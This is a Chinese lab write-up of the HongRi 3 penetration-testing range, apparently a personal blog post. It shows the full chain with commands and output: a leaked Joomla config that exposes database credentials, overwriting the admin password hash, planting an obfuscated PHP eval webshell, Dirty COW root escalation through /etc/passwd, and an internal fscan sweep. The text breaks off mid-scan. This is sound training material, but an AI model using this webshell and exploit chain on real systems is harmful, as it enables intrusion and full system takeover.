---

title: 红日3靶场（灵境平台）
date: 2026-03-14
categories:

  - 红日靶场
tags:
  - 渗透靶场

---

## 扫描端口
```bash
┌──(xvsf㉿kali)-[~]
└─$ nmap 192.168.242.92
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-12 03:22 -0400
Nmap scan report for 192.168.242.92
Host is up (0.0068s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 4.77 seconds

┌──(xvsf㉿kali)-[~]
└─$
```

开放了 80 、3306 、22 三个端口



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706895.png)





## <font style="color:rgb(79, 79, 79);">扫描</font><font style="color:rgb(252, 85, 49);"> cms</font>
`joomscan -u http://192.168.242.92/`



得到的信息：

1、Joomla 3.9.12

_<font style="color:rgb(217, 48, 37);">Joomla</font>_<font style="color:rgb(71, 71, 71);">是一款开源的内容管理系统（CMS），使用PHP编写，支持MySQL、MSSQL和PostgreSQL等多种数据库系统。</font>

2、

[http://192.168.242.92/administrator/components](http://192.168.242.92/administrator/components)

[http://192.168.242.92/administrator/modules](http://192.168.242.92/administrator/modules)

[http://192.168.242.92/administrator/templates](http://192.168.242.92/administrator/templates)

[http://192.168.242.92/images/banners](http://192.168.242.92/images/banners)



Interesting path found from robots.txt

[http://192.168.242.92/joomla/administrator/](http://192.168.242.92/joomla/administrator/)

[http://192.168.242.92/administrator/](http://192.168.242.92/administrator/)

[http://192.168.242.92/bin/](http://192.168.242.92/bin/)

[http://192.168.242.92/cache/](http://192.168.242.92/cache/)

[http://192.168.242.92/cli/](http://192.168.242.92/cli/)

[http://192.168.242.92/components/](http://192.168.242.92/components/)

[http://192.168.242.92/includes/](http://192.168.242.92/includes/)

[http://192.168.242.92/installation/](http://192.168.242.92/installation/)

[http://192.168.242.92/language/](http://192.168.242.92/language/)

[http://192.168.242.92/layouts/](http://192.168.242.92/layouts/)

[http://192.168.242.92/libraries/](http://192.168.242.92/libraries/)

[http://192.168.242.92/logs/](http://192.168.242.92/logs/)

[http://192.168.242.92/modules/](http://192.168.242.92/modules/)

[http://192.168.242.92/plugins/](http://192.168.242.92/plugins/)

[http://192.168.242.92/tmp/](http://192.168.242.92/tmp/)



3、数据库配置  config file path : [http://192.168.242.92/configuration.php~](http://192.168.242.92/configuration.php~)

```bash

    ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://192.168.242.92/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.9.12

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing :
http://192.168.242.92/administrator/components
http://192.168.242.92/administrator/modules
http://192.168.242.92/administrator/templates
http://192.168.242.92/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://192.168.242.92/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://192.168.242.92/robots.txt

Interesting path found from robots.txt
http://192.168.242.92/joomla/administrator/
http://192.168.242.92/administrator/
http://192.168.242.92/bin/
http://192.168.242.92/cache/
http://192.168.242.92/cli/
http://192.168.242.92/components/
http://192.168.242.92/includes/
http://192.168.242.92/installation/
http://192.168.242.92/language/
http://192.168.242.92/layouts/
http://192.168.242.92/libraries/
http://192.168.242.92/logs/
http://192.168.242.92/modules/
http://192.168.242.92/plugins/
http://192.168.242.92/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config file is found
 config file path : http://192.168.242.92/configuration.php~



Your Report : reports/192.168.242.92/

┌──(xvsf㉿kali)-[~]
└─$
```





访问配置文件：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706577.png)



疑似数据库账号密码：

        public $user = 'testuser';
    
        public $password = 'cvcvgjASD!@';
    
        public $db = 'joomla';

```bash
┌──(xvsf㉿kali)-[~]
└─$ curl http://192.168.242.92/configuration.php~
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = '网站正在维护。<br /> 请稍候访问。';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'test';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $debug_lang_const = '1';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'testuser';
        public $password = 'cvcvgjASD!@';
        public $db = 'joomla';
        public $dbprefix = 'am2zu_';
        public $live_site = '';
        public $secret = 'gXN9Wbpk7ef3A4Ys';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&lang={langcode}';
        public $ftp_host = '';
        public $ftp_port = '';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'test@test.com';
        public $fromname = 'test';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = '';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}                                                                                                                       
┌──(xvsf㉿kali)-[~]
└─$
```





### 现在可以尝试登录数据库：


```bash
┌──(xvsf㉿kali)-[~]
└─$ mysql -h 192.168.242.92 -u testuser -p'cvcvgjASD!@' --skip-ssl
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 33
Server version: 5.7.27-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```





```bash
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
+--------------------+
2 rows in set (0.012 sec)

MySQL [(none)]> use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [joomla]> show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
| am2zu_action_log_config       |
| am2zu_action_logs             |
| am2zu_action_logs_extensions  |
| am2zu_action_logs_users       |
| am2zu_assets                  |
| am2zu_associations            |
| am2zu_banner_clients          |
| am2zu_banner_tracks           |
| am2zu_banners                 |
| am2zu_categories              |
| am2zu_contact_details         |
| am2zu_content                 |
| am2zu_content_frontpage       |
| am2zu_content_rating          |
| am2zu_content_types           |
| am2zu_contentitem_tag_map     |
| am2zu_core_log_searches       |
| am2zu_extensions              |
| am2zu_fields                  |
| am2zu_fields_categories       |
| am2zu_fields_groups           |
| am2zu_fields_values           |
| am2zu_finder_filters          |
| am2zu_finder_links            |
| am2zu_finder_links_terms0     |
| am2zu_finder_links_terms1     |
| am2zu_finder_links_terms2     |
| am2zu_finder_links_terms3     |
| am2zu_finder_links_terms4     |
| am2zu_finder_links_terms5     |
| am2zu_finder_links_terms6     |
| am2zu_finder_links_terms7     |
| am2zu_finder_links_terms8     |
| am2zu_finder_links_terms9     |
| am2zu_finder_links_termsa     |
| am2zu_finder_links_termsb     |
| am2zu_finder_links_termsc     |
| am2zu_finder_links_termsd     |
| am2zu_finder_links_termse     |
| am2zu_finder_links_termsf     |
| am2zu_finder_taxonomy         |
| am2zu_finder_taxonomy_map     |
| am2zu_finder_terms            |
| am2zu_finder_terms_common     |
| am2zu_finder_tokens           |
| am2zu_finder_tokens_aggregate |
| am2zu_finder_types            |
| am2zu_languages               |
| am2zu_menu                    |
| am2zu_menu_types              |
| am2zu_messages                |
| am2zu_messages_cfg            |
| am2zu_modules                 |
| am2zu_modules_menu            |
| am2zu_newsfeeds               |
| am2zu_overrider               |
| am2zu_postinstall_messages    |
| am2zu_privacy_consents        |
| am2zu_privacy_requests        |
| am2zu_redirect_links          |
| am2zu_schemas                 |
| am2zu_session                 |
| am2zu_tags                    |
| am2zu_template_styles         |
| am2zu_ucm_base                |
| am2zu_ucm_content             |
| am2zu_ucm_history             |
| am2zu_update_sites            |
| am2zu_update_sites_extensions |
| am2zu_updates                 |
| am2zu_user_keys               |
| am2zu_user_notes              |
| am2zu_user_profiles           |
| am2zu_user_usergroup_map      |
| am2zu_usergroups              |
| am2zu_users                   |
| am2zu_utf8_conversion         |
| am2zu_viewlevels              |
| umnbt_action_log_config       |
| umnbt_action_logs             |
| umnbt_action_logs_extensions  |
| umnbt_action_logs_users       |
| umnbt_assets                  |
| umnbt_associations            |
| umnbt_banner_clients          |
| umnbt_banner_tracks           |
| umnbt_banners                 |
| umnbt_categories              |
| umnbt_contact_details         |
| umnbt_content                 |
| umnbt_content_frontpage       |
| umnbt_content_rating          |
| umnbt_content_types           |
| umnbt_contentitem_tag_map     |
| umnbt_core_log_searches       |
| umnbt_extensions              |
| umnbt_fields                  |
| umnbt_fields_categories       |
| umnbt_fields_groups           |
| umnbt_fields_values           |
| umnbt_finder_filters          |
| umnbt_finder_links            |
| umnbt_finder_links_terms0     |
| umnbt_finder_links_terms1     |
| umnbt_finder_links_terms2     |
| umnbt_finder_links_terms3     |
| umnbt_finder_links_terms4     |
| umnbt_finder_links_terms5     |
| umnbt_finder_links_terms6     |
| umnbt_finder_links_terms7     |
| umnbt_finder_links_terms8     |
| umnbt_finder_links_terms9     |
| umnbt_finder_links_termsa     |
| umnbt_finder_links_termsb     |
| umnbt_finder_links_termsc     |
| umnbt_finder_links_termsd     |
| umnbt_finder_links_termse     |
| umnbt_finder_links_termsf     |
| umnbt_finder_taxonomy         |
| umnbt_finder_taxonomy_map     |
| umnbt_finder_terms            |
| umnbt_finder_terms_common     |
| umnbt_finder_tokens           |
| umnbt_finder_tokens_aggregate |
| umnbt_finder_types            |
| umnbt_languages               |
| umnbt_menu                    |
| umnbt_menu_types              |
| umnbt_messages                |
| umnbt_messages_cfg            |
| umnbt_modules                 |
| umnbt_modules_menu            |
| umnbt_newsfeeds               |
| umnbt_overrider               |
| umnbt_postinstall_messages    |
| umnbt_privacy_consents        |
| umnbt_privacy_requests        |
| umnbt_redirect_links          |
| umnbt_schemas                 |
| umnbt_session                 |
| umnbt_tags                    |
| umnbt_template_styles         |
| umnbt_ucm_base                |
| umnbt_ucm_content             |
| umnbt_ucm_history             |
| umnbt_update_sites            |
| umnbt_update_sites_extensions |
| umnbt_updates                 |
| umnbt_user_keys               |
| umnbt_user_notes              |
| umnbt_user_profiles           |
| umnbt_user_usergroup_map      |
| umnbt_usergroups              |
| umnbt_users                   |
| umnbt_utf8_conversion         |
| umnbt_viewlevels              |
+-------------------------------+
156 rows in set (0.007 sec)

MySQL [joomla]>

```





查询管理员数据

```bash
MySQL [joomla]> SELECT id, name, username, password FROM am2zu_users;
+-----+------------+---------------+--------------------------------------------------------------+
| id  | name       | username      | password                                                     |
+-----+------------+---------------+--------------------------------------------------------------+
| 891 | Super User | administrator | $2y$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2 |
+-----+------------+---------------+--------------------------------------------------------------+
1 row in set (0.007 sec)

MySQL [joomla]>
```

 替换密码为 `secret`

```bash
MySQL [joomla]> UPDATE am2zu_users SET password='$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi' WHERE id=891;
Query OK, 1 row affected (0.035 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [joomla]>
```



### 登录 web 后台：
**URL:**`http://192.168.242.92/administrator/`

**Username:**`administrator`

**Password:**`password`



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151707207.png)



### 注入木马
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706321.png)





<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706569.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151705865.png)



写入木马：

```bash
<?php $Wsmj=create_function(chr(0x8ca0/0x3e8).chr(87285/759).base64_decode('bw==').chr(0x3d9-0x36c).base64_decode('ZQ=='),chr(52116/516).chr(056622/0313).chr(71877/741).chr(0720-0544).chr(11400/285).base64_decode('JA==').chr(28980/252).base64_decode('bw==').chr(0xb85d/0x1b1).base64_decode('ZQ==').base64_decode('KQ==').str_rot13(';'));$Wsmj(base64_decode('MTkzM'.'jI7QG'.'V2QWw'.'oJF9Q'.''.chr(57456/684).chr(0x742f/0x25f).base64_decode('Tg==').str_rot13('H').chr(01716-01567).''.''.chr(18000/360).str_rot13('A').chr(0x15a-0xe6).chr(48060/534).str_rot13('S').''.'0pOzU'.'3OTY2'.'Ow=='.''));?>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706849.png)





`[http://192.168.242.92/templates/beez3/shell.php](http://192.168.242.92/templates/beez3/shell.php)`

`cmd`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706236.png)



但是无法执行命令 

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151707781.png)



使用蚁剑的插件绕过函数限制

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151707134.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151707580.png)

成功绕过

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706775.png)



看大佬的 WP，找到了一组账号密码：

adduser wwwuser

passwd wwwuser_123Aqx

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706778.png)





### ssh 登录
wwwuser/wwwuser_123Aqx



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151707526.png)



换命令：

`ssh -o HostKeyAlgorithms=+ssh-rsa wwwuser@192.168.242.92`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151707288.png)



```bash
┌──(xvsf㉿kali)-[~]
└─$ ssh -o HostKeyAlgorithms=+ssh-rsa wwwuser@192.168.242.92
The authenticity of host '192.168.242.92 (192.168.242.92)' can't be established.
RSA key fingerprint is: SHA256:pVIGFsCgpYpKxtt43DtcC9NUBpUvyNCfIitNR9UsPRA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.242.92' (RSA) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
wwwuser@192.168.242.92's password:
Last login: Sun Oct  6 20:24:43 2019 from 192.168.1.122
[wwwuser@localhost ~]$ pwd
/home/wwwuser
[wwwuser@localhost ~]$ ls /
bin  boot  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  sbin  selinux  srv  sys  tmp  usr  var
[wwwuser@localhost ~]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
saslauth:x:499:76:"Saslauthd user":/var/empty/saslauth:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
nginx:x:498:498:nginx user:/var/cache/nginx:/sbin/nologin
wwwuser:x:500:500::/home/wwwuser:/bin/bash
[wwwuser@localhost ~]$ id
uid=500(wwwuser) gid=500(wwwuser) 组=500(wwwuser) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[wwwuser@localhost ~]$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 52:54:00:41:4a:48 brd ff:ff:ff:ff:ff:ff
    inet 192.168.242.92/24 brd 192.168.242.255 scope global eth3
    inet6 fe80::5054:ff:fe41:4a48/64 scope link
       valid_lft forever preferred_lft forever
3: eth2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 52:54:00:41:4a:49 brd ff:ff:ff:ff:ff:ff
    inet 192.168.93.100/24 brd 192.168.93.255 scope global eth2
    inet6 fe80::5054:ff:fe41:4a49/64 scope link
       valid_lft forever preferred_lft forever
4: eth4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 52:54:00:41:4a:50 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth4
    inet6 fec0::5054:ff:fe41:4a50/64 scope site dynamic
       valid_lft 86142sec preferred_lft 14142sec
    inet6 fe80::5054:ff:fe41:4a50/64 scope link
       valid_lft forever preferred_lft forever
[wwwuser@localhost ~]$
```



**当前权限:**

+  `wwwuser` (UID 500)， **Web 服务普通用户权限**。

**系统信息:**

+ 系统中有 `nginx` 用户
+ `/etc/passwd` 显示系统里除了 root 之外，只有 `wwwuser` 是有 `/bin/bash` 登录权限的普通用户。

**网络环境 :**

+ 有三张网卡：
    - `eth3`: `192.168.242.92`
    - `eth2`: `192.168.93.100`
    - `eth4`: `10.0.2.15`





### 提权
```bash
[wwwuser@localhost ~]$ uname -a
Linux localhost.localdomain 2.6.32-431.el6.x86_64 #1 SMP Fri Nov 22 03:15:09 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
[wwwuser@localhost ~]$

```

<font style="color:rgb(77, 77, 77);"></font>

> ### <font style="color:rgb(51, 51, 51);">Linux 提权</font>
> <font style="color:rgb(51, 51, 51);">1、内核提权(脏牛肉提权）</font>
>
> <font style="color:rgb(51, 51, 51);">2、suid提权</font>
>
> <font style="color:rgb(51, 51, 51);">3、sudo提权</font>
>
> <font style="color:rgb(51, 51, 51);">4、数据库提权</font>
>
> `<font style="color:rgb(51, 51, 51);">sudo -l</font>`<font style="color:rgb(51, 51, 51);"> 查看特权命令 </font>
>
> <font style="color:rgb(51, 51, 51);">不能使用sudo命令</font>
>



#### <font style="color:rgb(51, 51, 51);">suid提权，</font>
<font style="color:rgb(51, 51, 51);">通过命令</font>`<font style="color:rgb(51, 51, 51);">find / -perm -4000 2>/dev/null</font>`<font style="color:rgb(51, 51, 51);">查看是否具有root权限的命令</font>

```bash
[wwwuser@localhost ~]$ sudo -l
[sudo] password for wwwuser:
对不起，用户 wwwuser 不能在 localhost 上运行 sudo。
[wwwuser@localhost ~]$ find / -perm -4000 2>/dev/null
/bin/mount
/bin/fusermount
/bin/ping
/bin/ping6
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chage
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/crontab
/usr/bin/sudo
/usr/sbin/usernetctl
/usr/libexec/openssh/ssh-keysign
/usr/libexec/pt_chown
/sbin/pam_timestamp_check
/sbin/unix_chkpwd
[wwwuser@localhost ~]$
```

#### <font style="color:rgb(51, 51, 51);">内核提权</font>
<font style="color:rgb(51, 51, 51);">脏牛肉提权（CVE-2016-5195）</font>

[Linux脏牛(CVE-2016-5195)提权保姆级教程](https://blog.csdn.net/weixin_68408599/article/details/132332072)

[脏牛-Linux内核提权 _](https://www.cnblogs.com/Junglezt/p/15548392.html)

> <font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">dirty.c内置在了kali中，使用命令</font>`**<font style="color:rgb(216, 59, 100);background-color:rgb(249, 242, 244);">searchsploit dirty</font>**`<font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">可以搜索</font>
>
> <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151705440.png)
>
> 
>
> <font style="color:rgb(35, 38, 59);background-color:rgba(255, 255, 255, 0.9);">低权限的用户能够在本地进行提权获取管理员权限</font>
>
> <font style="color:rgb(85, 85, 85);background-color:rgb(247, 247, 247) !important;">大概原理，Linux内核子系统在写入时产生了条件竞争。条件竞争就是程序在处理的时候异常，可能会让程序报错，这样让攻击者就有机可乘。</font>
>



**靶机的内核 2.6.32-431.el6.x86_64** 是典型的 CentOS 6.5  



在 Kali 上把代码导出来：

```bash
searchsploit -m linux/local/40616.c
```

然后，使用 scp 上传。由于你目前是 `wwwuser`，建议传到有写权限的 `/tmp` 目录：

```bash
scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa 40616.c wwwuser@192.168.242.92:/tmp/dirty.c
```

```bash
┌──(xvsf㉿kali)-[~/tmp]
└─$     searchsploit -m linux/local/40839.c
  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
      URL: https://www.exploit-db.com/exploits/40839
     Path: /usr/share/exploitdb/exploits/linux/local/40839.c
    Codes: CVE-2016-5195
 Verified: True
File Type: C source, ASCII text
Copied to: /home/xvsf/tmp/40839.c

┌──(xvsf㉿kali)-[~/tmp]
└─$ ls
40839.c

┌──(xvsf㉿kali)-[~/tmp]
└─$ scp 40839.c wwwuser@192.168.242.92:/tmp/dirty.c
Unable to negotiate with 192.168.242.92 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
scp: Connection closed

┌──(xvsf㉿kali)-[~/tmp]
└─$ scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa 40839.c wwwuser@192.168.242.92:/tmp/dirty.c
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
wwwuser@192.168.242.92's password:
40839.c                                                                               100% 4814     1.7MB/s   00:00

┌──(xvsf㉿kali)-[~/tmp]
└─$                                                                              100% 4803   881.3KB/s   00:00

```





`gcc -pthread dirty.c -o dirty -lcrypt`

虽然有一些警告，但是只要编译成功就可以了

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151707859.png)



提权

` ./dirty 123456`

```bash
[wwwuser@localhost tmp]$ ./dirty 123456
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 123456
Complete line:
firefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash

mmap: 7f630befe000
^C
[wwwuser@localhost tmp]$ cat /etc/passwd | head -n 1
firefart:fi8RL.Us0cfSs:0:0:pwned:/root:/bin/bash
[wwwuser@localhost tmp]$ su firefart
密码：
[firefart@localhost tmp]# id
uid=0(firefart) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[firefart@localhost tmp]#
```

这里卡住的话直接 ctrl+C 退出即可，然后验证提权成功

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202603151706856.png)







### 收集信息


上传 fscan

```bash
scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa fscan wwwuser@192.168.242.92:/tmp/
```


`chmod +x fscan`


`./fscan -h 192.168.93.0/24`





```bash
[firefart@localhost tmp]# ls
bak  dirty  dirty.c  fscan  passwd.bak  yum.log
[firefart@localhost tmp]# chmod +x fscan
[firefart@localhost tmp]# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 52:54:00:41:4a:48 brd ff:ff:ff:ff:ff:ff
    inet 192.168.242.92/24 brd 192.168.242.255 scope global eth3
    inet6 fe80::5054:ff:fe41:4a48/64 scope link
       valid_lft forever preferred_lft forever
3: eth2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 52:54:00:41:4a:49 brd ff:ff:ff:ff:ff:ff
    inet 192.168.93.100/24 brd 192.168.93.255 scope global eth2
    inet6 fe80::5054:ff:fe41:4a49/64 scope link
       valid_lft forever preferred_lft forever
4: eth4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 52:54:00:41:4a:50 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth4
    inet6 fec0::5054:ff:fe41:4a50/64 scope site dynamic
       valid_lft 86204sec preferred_lft 14204sec
    inet6 fe80::5054:ff:fe41:4a50/64 scope link
       valid_lft forever preferred_lft forever


[firefart@localhost tmp]# ./fscan -h 192.168.93.0/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 192.168.93.100  is alive
(icmp) Target 192.168.93.30   is alive
(icmp) Target 192.168.93.10   is alive
(icmp) Target 192.168.93.20   is alive
(icmp) Target 192.168.93.120  is alive
[*] Icmp alive hosts len is: 5
192.168.93.30:139 open
192.168.93.100:22 open
192.168.93.20:135 open
192.168.93.10:135 open
192.168.93.30:135 open
192.168.93.120:80 open
192.168.93.20:80 open
192.168.93.100:80 open
192.168.93.120:22 open
192.168.93.30:445 open
192.168.93.20:1433 open
192.168.93.20:445 open
192.168.93.120:3306 open
192.168.93.10:445 open
192.168.93.100:3306 open
192.168.93.10:139 open
192.168.93.20:139 open
192.168.93.10:88 open
[*] alive ports len is: 18
start vulscan
[*] NetInfo
[*]192.168.93.30
   [->]win7
   [->]192.168.93.30
[*] NetInfo
[*]192.168.93.20
   [->]win2008
   [->]192.168.93.20
[*] WebTitle http://192.168.93.20      code:404 len:315    title:Not Found
[*] NetInfo
[*]192.168.93.10
   [->]WIN-8GA56TNV3MV
   [->]192.168.93.10
[*] OsInfo 192.168.93.10        (Windows Server 2012 R2 Datacenter 9600)
[*] OsInfo 192.168.93.20        (Windows Server (R) 2008 Datacenter 6003 Service Pack 2)
[*] OsInfo 192.168.93.30        (Windows 7 Professional 7601 Service Pack 1)
[*] WebTitle http://192.168.93.120     code:200 len:16020  title:Home
[*] WebTitle http://192.168.93.100     code:200 len:16020  title:Home
[+] mysql 192.168.93.100:3306:root 123
[+] mysql 192.168.93.120:3306:root 123
已完成 16/18 [-] ssh 192.168.93.120:22 root P@ssw0rd ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
